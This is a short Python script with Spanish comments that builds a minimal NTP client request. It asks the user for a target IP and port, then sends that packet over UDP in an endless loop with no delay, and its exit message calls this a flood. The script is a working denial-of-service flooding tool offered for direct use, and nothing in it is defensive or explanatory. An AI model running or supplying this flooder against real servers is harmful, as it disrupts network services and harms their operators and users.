import socket
import struct

def build_ntp_request():
    # Construye un paquete NTP simple (Client mode, versión 3)
    # NTP Header: LI=0, VN=3, Mode=3 (client)
    msg = b'\x1b' + 47 * b'\0'
    return msg

def main():
    target_ip = input("Ingresa la IP del servidor NTP objetivo: ").strip()
    target_port = int(input("Ingresa el puerto de destino (por defecto 123): ").strip())

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    ntp_payload = build_ntp_request()

    try:
        while True:
            sock.sendto(ntp_payload, (target_ip, target_port))
            # Puedes poner un pequeño delay si deseas
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nFlood detenido por el usuario.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
